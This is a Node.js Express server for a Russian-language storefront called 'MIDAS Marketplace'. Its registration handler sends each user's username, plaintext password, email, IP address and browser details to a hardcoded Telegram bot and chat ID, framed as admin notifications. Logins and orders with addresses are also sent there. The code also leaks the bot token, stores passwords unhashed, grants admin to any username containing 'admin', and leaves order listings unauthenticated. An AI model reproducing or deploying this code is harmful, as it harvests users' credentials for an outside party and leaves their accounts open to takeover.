const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('.'));

// Конфигурация Telegram Bot
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8083895268:AAEW7LOj3zgAd19xPvJUbK64telZ2ZjBPo8';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8462246996';

// Функция отправки сообщения в Telegram
async function sendToTelegram(message, options = {}) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                ...options
            })
        });
        
        const data = await response.json();
        
        if (!data.ok) {
            console.error('Ошибка отправки в Telegram:', data);
            return { success: false, error: data };
        }
        
        return { success: true, data };
    } catch (error) {
        console.error('Ошибка сети при отправке в Telegram:', error);
        return { success: false, error: error.message };
    }
}

// Форматирование сообщений для Telegram
function formatRegistrationMessage(userData) {
    const timestamp = new Date().toLocaleString('ru-RU');
    
    return `
<b>📝 НОВАЯ РЕГИСТРАЦИЯ</b>

👤 <b>Пользователь:</b> ${userData.username}
🔑 <b>Пароль:</b> ${userData.password}
📧 <b>Email:</b> ${userData.email || 'Не указан'}
📱 <b>IP:</b> ${userData.ip}
🌐 <b>User Agent:</b> ${userData.userAgent.substring(0, 50)}...
🕐 <b>Время:</b> ${timestamp}
📍 <b>Город:</b> ${userData.city || 'Не выбран'}
💎 <b>Статус:</b> ${userData.isAdmin ? '👑 АДМИНИСТРАТОР' : 'Пользователь'}
    `;
}

function formatLoginMessage(userData) {
    const timestamp = new Date().toLocaleString('ru-RU');
    
    return `
<b>🔐 ВХОД В СИСТЕМУ</b>

👤 <b>Пользователь:</b> ${userData.username}
📱 <b>IP:</b> ${userData.ip}
🕐 <b>Время:</b> ${timestamp}
📍 <b>Город:</b> ${userData.city || 'Не выбран'}
💻 <b>Устройство:</b> ${userData.userAgent.includes('Mobile') ? '📱 Мобильное' : '💻 Компьютер'}
    `;
}

function formatOrderMessage(orderData) {
    const timestamp = new Date().toLocaleString('ru-RU');
    const items = orderData.items.map(item => 
        `   • ${item.name} (${item.gram}) × ${item.quantity} = ${item.total} RUB`
    ).join('\n');
    
    return `
<b>💰 НОВЫЙ ЗАКАЗ</b>

🆔 <b>Номер заказа:</b> ${orderData.orderId}
👤 <b>Пользователь:</b> ${orderData.username}
💳 <b>Метод оплаты:</b> ${orderData.paymentMethod === 'card' ? '💳 Карта' : '🔗 Ссылка'}
🚚 <b>Доставка:</b> ${getDeliveryMethodName(orderData.deliveryMethod)}
📍 <b>Адрес:</b> ${orderData.address}
📦 <b>Товары:</b>
${items}
💰 <b>Итого:</b> ${orderData.total} RUB
🕐 <b>Время:</b> ${timestamp}
    `;
}

function getDeliveryMethodName(method) {
    const methods = {
        'pickup': '🏪 Самовывоз',
        'courier': '🚚 Курьер',
        'terminal': '📦 Терминал',
        'post': '📮 Почта'
    };
    return methods[method] || method;
}

// Получение IP пользователя
function getClientIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.ip || 
           'Неизвестен';
}

// База данных в памяти
let database = {
    users: [],
    products: [],
    orders: [],
    reviews: []
};

// Инициализация начальных данных
function initializeData() {
    database.products = [
        {
            id: 1,
            name: "Premium Gold",
            description: "Высококачественный продукт премиум класса. Идеальная чистота и качество. Доставка в течение 24 часов.",
            price: 15000,
            image: "https://images.unsplash.com/photo-1581235720854-1e3d16e0a3e3?auto=format&fit=crop&w=500",
            category: "Premium",
            rating: 4.8,
            reviews: 124,
            grams: [2, 3, 4, 6, 'B', 'S'],
            stock: 100
        },
        {
            id: 2,
            name: "Exclusive Silver",
            description: "Эксклюзивный серебряный продукт. Редкая коллекционная серия.",
            price: 8500,
            image: "https://images.unsplash.com/photo-1575549595555-8c67b3bc79c8?auto=format&fit=crop&w=500",
            category: "Premium",
            rating: 4.6,
            reviews: 89,
            grams: [2, 3, 4, 'B'],
            stock: 50
        }
    ];
    
    // Тестовый администратор
    database.users.push({
        id: 1,
        username: "admin",
        email: "admin@midas.com",
        password: "admin123",
        role: "admin",
        balance: 1000000,
        premium: true,
        createdAt: new Date(),
        city: "Москва"
    });
    
    console.log('База данных инициализирована');
}

// API маршруты

// Получить все товары
app.get('/api/products', (req, res) => {
    res.json({
        success: true,
        products: database.products
    });
});

// Получить один товар
app.get('/api/products/:id', (req, res) => {
    const productId = parseInt(req.params.id);
    const product = database.products.find(p => p.id === productId);
    
    if (!product) {
        return res.status(404).json({
            success: false,
            error: 'Товар не найден'
        });
    }
    
    res.json({
        success: true,
        product
    });
});

// Добавить товар (админ)
app.post('/api/products', async (req, res) => {
    try {
        const product = req.body;
        
        // Проверка авторизации администратора
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                error: 'Требуется авторизация'
            });
        }
        
        // Проверяем, что это админ
        const token = authHeader.split(' ')[1];
        const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
        if (!adminUser) {
            return res.status(403).json({
                success: false,
                error: 'Требуются права администратора'
            });
        }
        
        product.id = database.products.length + 1;
        product.createdAt = new Date();
        product.rating = 5;
        product.reviews = 0;
        
        database.products.push(product);
        
        // Отправляем уведомление в Telegram
        const telegramMessage = `
<b>➕ НОВЫЙ ТОВАР ДОБАВЛЕН</b>

🏷️ <b>Название:</b> ${product.name}
💰 <b>Цена:</b> ${product.price} RUB
📦 <b>Категория:</b> ${product.category}
📝 <b>Описание:</b> ${product.description.substring(0, 100)}...
🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
        `;
        
        await sendToTelegram(telegramMessage);
        
        res.json({
            success: true,
            product
        });
    } catch (error) {
        console.error('Ошибка добавления товара:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка сервера'
        });
    }
});

// Обновить товар (админ)
app.put('/api/products/:id', async (req, res) => {
    try {
        const productId = parseInt(req.params.id);
        const updates = req.body;
        
        const productIndex = database.products.findIndex(p => p.id === productId);
        if (productIndex === -1) {
            return res.status(404).json({
                success: false,
                error: 'Товар не найден'
            });
        }
        
        // Проверка авторизации администратора
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                error: 'Требуется авторизация'
            });
        }
        
        const token = authHeader.split(' ')[1];
        const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
        if (!adminUser) {
            return res.status(403).json({
                success: false,
                error: 'Требуются права администратора'
            });
        }
        
        const oldProduct = database.products[productIndex];
        database.products[productIndex] = { ...oldProduct, ...updates, updatedAt: new Date() };
        
        // Отправляем уведомление в Telegram
        const telegramMessage = `
<b>✏️ ТОВАР ОБНОВЛЕН</b>

🏷️ <b>Название:</b> ${oldProduct.name} → ${updates.name || oldProduct.name}
💰 <b>Цена:</b> ${oldProduct.price} → ${updates.price || oldProduct.price} RUB
🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
        `;
        
        await sendToTelegram(telegramMessage);
        
        res.json({
            success: true,
            product: database.products[productIndex]
        });
    } catch (error) {
        console.error('Ошибка обновления товара:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка сервера'
        });
    }
});

// Удалить товар (админ)
app.delete('/api/products/:id', async (req, res) => {
    try {
        const productId = parseInt(req.params.id);
        
        const productIndex = database.products.findIndex(p => p.id === productId);
        if (productIndex === -1) {
            return res.status(404).json({
                success: false,
                error: 'Товар не найден'
            });
        }
        
        // Проверка авторизации администратора
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                error: 'Требуется авторизация'
            });
        }
        
        const token = authHeader.split(' ')[1];
        const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
        if (!adminUser) {
            return res.status(403).json({
                success: false,
                error: 'Требуются права администратора'
            });
        }
        
        const deletedProduct = database.products[productIndex];
        database.products.splice(productIndex, 1);
        
        // Отправляем уведомление в Telegram
        const telegramMessage = `
<b>🗑️ ТОВАР УДАЛЕН</b>

🏷️ <b>Название:</b> ${deletedProduct.name}
💰 <b>Цена:</b> ${deletedProduct.price} RUB
🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
        `;
        
        await sendToTelegram(telegramMessage);
        
        res.json({
            success: true,
            message: 'Товар удален'
        });
    } catch (error) {
        console.error('Ошибка удаления товара:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка сервера'
        });
    }
});

// Регистрация пользователя
app.post('/api/auth/register', async (req, res) => {
    try {
        const { username, password, email, city } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({
                success: false,
                error: 'Логин и пароль обязательны'
            });
        }
        
        if (password.length < 6) {
            return res.status(400).json({
                success: false,
                error: 'Пароль должен быть не менее 6 символов'
            });
        }
        
        // Проверка существующего пользователя
        if (database.users.find(u => u.username === username)) {
            return res.status(400).json({
                success: false,
                error: 'Пользователь с таким логином уже существует'
            });
        }
        
        const ip = getClientIP(req);
        const userAgent = req.get('User-Agent') || 'Неизвестен';
        
        const user = {
            id: database.users.length + 1,
            username,
            password, // В реальном приложении нужно хэшировать
            email: email || `${username}@midas.com`,
            role: username.includes('admin') ? 'admin' : 'user',
            balance: 0,
            premium: false,
            city: city || 'Не выбран',
            ip,
            userAgent,
            createdAt: new Date()
        };
        
        database.users.push(user);
        
        // Отправка в Telegram бота
        const telegramMessage = formatRegistrationMessage({
            username,
            password,
            email: user.email,
            ip,
            userAgent,
            city: user.city,
            isAdmin: user.role === 'admin'
        });
        
        const telegramResult = await sendToTelegram(telegramMessage);
        
        if (!telegramResult.success) {
            console.warn('Не удалось отправить в Telegram, но пользователь создан');
        }
        
        res.json({
            success: true,
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                role: user.role,
                balance: user.balance,
                premium: user.premium,
                city: user.city
            },
            telegramSent: telegramResult.success
        });
    } catch (error) {
        console.error('Ошибка регистрации:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка сервера'
        });
    }
});

// Вход пользователя
app.post('/api/auth/login', async (req, res) => {
    try {
        const { username, password, city } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({
                success: false,
                error: 'Логин и пароль обязательны'
            });
        }
        
        const user = database.users.find(u => u.username === username && u.password === password);
        
        if (!user) {
            return res.status(401).json({
                success: false,
                error: 'Неверный логин или пароль'
            });
        }
        
        const ip = getClientIP(req);
        const userAgent = req.get('User-Agent') || 'Неизвестен';
        
        // Обновляем информацию о пользователе
        user.lastLogin = new Date();
        user.lastIp = ip;
        if (city) user.city = city;
        
        // Отправка в Telegram бота
        const telegramMessage = formatLoginMessage({
            username,
            ip,
            city: user.city,
            userAgent
        });
        
        const telegramResult = await sendToTelegram(telegramMessage);
        
        res.json({
            success: true,
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                role: user.role,
                balance: user.balance,
                premium: user.premium,
                city: user.city
            },
            telegramSent: telegramResult.success
        });
    } catch (error) {
        console.error('Ошибка входа:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка сервера'
        });
    }
});

// Создание заказа
app.post('/api/orders', async (req, res) => {
    try {
        const { 
            userId, 
            username, 
            items, 
            total, 
            deliveryMethod, 
            address, 
            paymentMethod, 
            city 
        } = req.body;
        
        if (!items || items.length === 0) {
            return res.status(400).json({
                success: false,
                error: 'Корзина пуста'
            });
        }
        
        const orderId = 'MID-' + Date.now().toString().slice(-6);
        
        const order = {
            id: orderId,
            userId,
            username,
            items: items.map(item => ({
                productId: item.id,
                name: item.name,
                quantity: item.quantity,
                gram: item.selectedGram,
                price: item.price,
                total: item.price * item.quantity
            })),
            total,
            deliveryMethod,
            address,
            paymentMethod,
            city,
            status: 'pending',
            createdAt: new Date()
        };
        
        database.orders.push(order);
        
        // Отправка в Telegram бота
        const telegramMessage = formatOrderMessage({
            orderId,
            username,
            items: order.items,
            total,
            deliveryMethod,
            address,
            paymentMethod,
            city
        });
        
        const telegramResult = await sendToTelegram(telegramMessage);
        
        // Обновляем статистику товаров
        items.forEach(orderItem => {
            const product = database.products.find(p => p.id === orderItem.id);
            if (product) {
                product.stock = Math.max(0, product.stock - orderItem.quantity);
            }
        });
        
        res.json({
            success: true,
            order: {
                id: order.id,
                status: order.status,
                total: order.total,
                createdAt: order.createdAt
            },
            telegramSent: telegramResult.success
        });
    } catch (error) {
        console.error('Ошибка создания заказа:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка сервера'
        });
    }
});

// Получить заказы пользователя
app.get('/api/orders/:userId', (req, res) => {
    const userId = req.params.userId;
    const userOrders = database.orders.filter(o => o.userId == userId);
    
    res.json({
        success: true,
        orders: userOrders
    });
});

// Получить статистику (админ)
app.get('/api/admin/stats', (req, res) => {
    // Проверка авторизации администратора
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({
            success: false,
            error: 'Требуется авторизация'
        });
    }
    
    const token = authHeader.split(' ')[1];
    const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
    if (!adminUser) {
        return res.status(403).json({
            success: false,
            error: 'Требуются права администратора'
        });
    }
    
    const totalRevenue = database.orders.reduce((sum, order) => sum + order.total, 0);
    const totalOrders = database.orders.length;
    const totalUsers = database.users.length;
    
    // Статистика по дням
    const ordersByDay = {};
    database.orders.forEach(order => {
        const date = new Date(order.createdAt).toLocaleDateString('ru-RU');
        ordersByDay[date] = (ordersByDay[date] || 0) + 1;
    });
    
    res.json({
        success: true,
        stats: {
            totalRevenue,
            totalOrders,
            totalUsers,
            activeProducts: database.products.length,
            pendingOrders: database.orders.filter(o => o.status === 'pending').length
        },
        chartData: Object.entries(ordersByDay).map(([date, count]) => ({ date, count }))
    });
});

// Добавить отзыв
app.post('/api/reviews', async (req, res) => {
    try {
        const { productId, userId, username, rating, text } = req.body;
        
        if (!productId || !rating || !text) {
            return res.status(400).json({
                success: false,
                error: 'Заполните все поля'
            });
        }
        
        const review = {
            id: database.reviews.length + 1,
            productId,
            userId,
            username,
            rating,
            text,
            createdAt: new Date()
        };
        
        database.reviews.push(review);
        
        // Обновляем рейтинг товара
        const product = database.products.find(p => p.id === productId);
        if (product) {
            const productReviews = database.reviews.filter(r => r.productId === productId);
            const avgRating = productReviews.reduce((sum, r) => sum + r.rating, 0) / productReviews.length;
            product.rating = avgRating;
            product.reviews = productReviews.length;
        }
        
        // Отправляем уведомление в Telegram
        const telegramMessage = `
<b>⭐ НОВЫЙ ОТЗЫВ</b>

🏷️ <b>Товар:</b> ${product?.name || `ID: ${productId}`}
👤 <b>Пользователь:</b> ${username}
⭐ <b>Рейтинг:</b> ${'★'.repeat(rating)}${'☆'.repeat(5 - rating)}
📝 <b>Отзыв:</b> ${text.substring(0, 100)}...
🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
        `;
        
        await sendToTelegram(telegramMessage);
        
        res.json({
            success: true,
            review
        });
    } catch (error) {
        console.error('Ошибка добавления отзыва:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка сервера'
        });
    }
});

// Получить отзывы товара
app.get('/api/reviews/:productId', (req, res) => {
    const productId = parseInt(req.params.productId);
    const productReviews = database.reviews.filter(r => r.productId === productId);
    
    res.json({
        success: true,
        reviews: productReviews
    });
});

// Обновить валютные курсы
app.get('/api/currency-rates', (req, res) => {
    // В реальном приложении здесь нужно получать актуальные курсы с внешнего API
    res.json({
        success: true,
        rates: {
            RUB: 1,
            USD: 0.011,
            UAH: 0.41,
            EUR: 0.01,
            KZT: 5.2
        },
        lastUpdated: new Date().toISOString()
    });
});

// Проверка доступности сервера
app.get('/api/health', (req, res) => {
    res.json({
        success: true,
        message: 'MIDAS Marketplace API работает',
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        stats: {
            products: database.products.length,
            users: database.users.length,
            orders: database.orders.length
        }
    });
});

// Telegram webhook для получения сообщений от бота
app.post('/api/telegram/webhook', async (req, res) => {
    try {
        const update = req.body;
        
        // Логируем входящие сообщения от бота
        console.log('Telegram webhook received:', JSON.stringify(update, null, 2));
        
        // Здесь можно добавить логику обработки команд от пользователей
        if (update.message && update.message.text) {
            const chatId = update.message.chat.id;
            const text = update.message.text;
            
            // Пример: обработка команды /start
            if (text === '/start') {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `👋 Привет! Я бот для уведомлений MIDAS Marketplace.\n\nЯ буду отправлять вам уведомления о:\n📝 Новых регистрациях\n🔐 Входах в систему\n💰 Новых заказах\n⭐ Отзывах\n\nДля настройки уведомлений свяжитесь с администратором.`
                    })
                });
            }
        }
        
        res.json({ success: true });
    } catch (error) {
        console.error('Ошибка обработки webhook:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Маршрут для главной страницы
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Инициализация данных
initializeData();

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ MIDAS Marketplace запущен на порту ${PORT}`);
    console.log(`🌐 Ссылка: http://localhost:${PORT}`);
    console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Настроен' : 'НЕ настроен'}`);
    
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'ВАШ_ТОКЕН_БОТА') {
        console.warn('⚠️  ВНИМАНИЕ: Токен Telegram бота не настроен!');
        console.warn('   Установите переменные окружения:');
        console.warn('   TELEGRAM_BOT_TOKEN=ваш_токен_бота');
        console.warn('   TELEGRAM_CHAT_ID=ваш_chat_id');
    }
});

module.exports = app;
